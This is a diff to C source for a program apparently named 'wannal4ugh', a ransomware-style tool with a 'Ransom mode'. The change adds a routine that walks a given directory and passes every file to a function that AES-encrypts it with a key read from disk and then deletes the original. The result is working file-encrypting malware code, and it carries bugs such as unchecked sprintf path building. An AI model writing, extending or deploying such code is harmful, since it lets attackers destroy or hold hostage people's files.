@@ -1,3 +1,6 @@
+#define _XOPEN_SOURCE 700
+#include <sys/types.h>
+#include <dirent.h>
 #include "wannal4ugh.h"
 #include <stdio.h>
 #include <unistd.h>
@@ -8,7 +11,7 @@
 #define BUFSIZE 1024
 
 /* Uncomment the next line for more verbose output */
-// #define _DEBUG_
+/* #define _DEBUG_*/
 
 void printUsage()
 {
@@ -36,7 +39,7 @@ int main(int argc, char *argv[])
 		{
 		case 'e':
 			// printf("Ransom mode: target directory = %s\n", optarg);
-			encryptFile(optarg);
+			getFilenames(optarg);
 			break;
 		case 'o':
 			printf("Obfuscate mode: number of files = %d\n", atoi(optarg));
@@ -63,8 +66,8 @@ void encryptFile(char *filename)
 	unsigned char data[AES_BLOCK_SIZE];
 	unsigned char encrypted_data[AES_BLOCK_SIZE];
 	unsigned char *key = aes_read_key("aes_key.txt");
-	// unsigned char *iv = (unsigned char *)"143278389942760";
 
+	printf("Encrypting file: %s\n", filename);
 	FILE *fd_src = fopen(filename, "r");
 	if (fd_src == NULL)
 		return;
@@ -112,4 +115,29 @@ void encryptFile(char *filename)
 	fclose(fd_dest);
 	free(key);
 	remove(filename);
+}
+
+void getFilenames(char *directory)
+{
+	DIR *dp;
+	struct dirent *ep;
+	dp = opendir(directory);
+	char buffer[BUFSIZE];
+
+	if (dp != NULL)
+	{
+		while ((ep = readdir(dp)) != NULL)
+		{
+			/* we don't want the .. and . links in the directory */
+			if ((strcmp(ep->d_name, "..") != 0) && (strcmp(ep->d_name, ".") != 0))
+			{
+				sprintf(buffer, "%s%s", directory, (char *)ep->d_name);
+				encryptFile(buffer);
+			}
+		}
+
+		(void)closedir(dp);
+	}
+	else
+		perror("Couldn't open the directory");
 }
